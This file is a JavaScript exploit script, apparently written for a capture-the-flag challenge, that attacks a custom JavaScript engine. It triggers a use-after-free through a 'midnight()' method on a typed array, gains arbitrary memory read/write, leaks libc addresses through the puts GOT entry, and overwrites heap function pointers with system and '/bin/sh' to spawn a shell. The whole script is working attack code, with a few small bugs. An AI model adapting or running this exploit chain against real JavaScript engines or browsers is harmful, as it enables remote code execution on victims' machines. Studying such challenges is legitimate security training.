(function () {

    const byteToHex = new Array(256);

    for (var n = 0; n <= 0xf; ++n) {
        byteToHex[n] = '0' + n.toString(16);
    }

    for (var n = 0x10; n <= 0xff; ++n) {
        byteToHex[n] = n.toString(16);
    }

    function toHex(buf) {
        const octets = new Array(buf.length);

        for (var n = 0; n < buf.length; n++) {
            octets[n] = byteToHex[buf[n]];
        }

        return octets.join('');
    }

    function fmtPtr(low, high) {
        var lowS = low.toString(16);
        if (lowS.length < 8) {
            lowS = ("0" * (8 - lowS.length)) + lowS;
        }
        return "0x" + high.toString(16) + lowS;
    }

    function ptrToF64(low, high) {
        const arr = new Uint32Array([low, high]);
        const view = new DataView(arr.buffer);
        return view.getFloat64();
    }

    console.log("[+] Hello!");

    const freed = new Uint8Array(0x28);

    console.log("[+] Freeing...");
    freed.midnight();

    console.log("[+] Allocating...");
    const readWriter = new Uint8Array(0x1337);

    console.log("[+] Making sure we hit freed...");
    const freedView = new DataView(freed.buffer);
    if (freedView.getInt16(24, true) != 0x1337) {
        console.log("[-] couldnt catch the freed array, exiting...");
        return;
    }

    const dataPtrLow = freedView.getUint32(32, true), dataPtrHigh = freedView.getUint32(36, true);
    console.log("[+] data pointer: ", fmtPtr(dataPtrLow, dataPtrHigh));

    console.log("[+] Acheiving abs r/w...");

    freedView.setUint32(24, 0xffffffff, true);
    freedView.setUint32(28, 0xffffffff, true);

    function setReadWriterPtr(low, high) {
        freedView.setUint32(32, low, true);
        freedView.setUint32(36, high, true);
    }

    // We could leak these if the binary had PIE...
    const myFatalLow = 0x402b9c, myFatalHigh = 0;
    const myUDataLow = 0xdeadbeef, myUDataHigh = 0;

    console.log("[+] Looking for heap...")
    var pageLow = dataPtrLow & 0xfffff000, pageHigh = dataPtrHigh;
    var found = false;

    while (1) {
        console.log("[+] current: ", fmtPtr(pageLow, pageHigh))
        setReadWriterPtr(pageLow, pageHigh);
        const pageData = new DataView(readWriter.buffer, 0, 0x1000);
        for (var i = 0; i < 0xff0; i += 8) {
            const n1 = pageData.getUint32(i, true);
            const n2 = pageData.getUint32(i + 4, true);
            const n3 = pageData.getUint32(i + 8, true);
            const n4 = pageData.getUint32(i + 12, true);
            if (n1 == myUDataLow && n2 == myUDataHigh && n3 == myFatalLow && n4 == myFatalHigh) {
                console.log("Found!");
                found = true;
                break;
            }
        }

        if (found) {
            break;
        }

        if (pageLow != 0) {
            pageLow -= 0x1000
        }
        else {
            console.log("[-] bad page found...");
            return;
        }
    }

    const heapLow = pageLow + i - 0x18, heapHigh = pageHigh; // TODO: Overflow
    console.log("[+] heap is at: ", fmtPtr(heapLow, heapHigh));

    const putsGOTLow = 0x4931a0, putsGOTHigh = 0;
    setReadWriterPtr(putsGOTLow, putsGOTHigh);
    const putsGOTView = new DataView(readWriter.buffer);
    const putsLow = putsGOTView.getUint32(0, true), putsHigh = putsGOTView.getUint32(4, true);
    console.log("puts address: ", fmtPtr(putsLow, putsHigh));

    const systemLow = putsLow - 0x32190, systemHigh = putsHigh; // TODO: Overflow
    console.log("system address: ", fmtPtr(systemLow, systemHigh));
    const systemF64 = ptrToF64(systemLow, systemHigh);

    const binshLow = putsLow + 0x13016d, binshHigh = putsHigh; // TODO: Overflow 
    console.log("/bin/sh address: ", fmtPtr(binshLow, binshHigh));
    const binshF64 = ptrToF64(binshLow, binshHigh);

    setReadWriterPtr(heapLow, heapHigh);
    const heapView = new DataView(readWriter.buffer);
    heapView.setFloat64(0x18, binshF64);

    heapView.setFloat64(0x0, systemF64);
    heapView.setFloat64(0x8, systemF64);
    heapView.setFloat64(0x10, systemF64);

    console.log("[!] Unreachable!");
    while (1) { }

    console.log("[+] Fake use: ", corruptArr);
    console.log("[+] Fake use:", freed);
    console.log("[+] Done!");
})();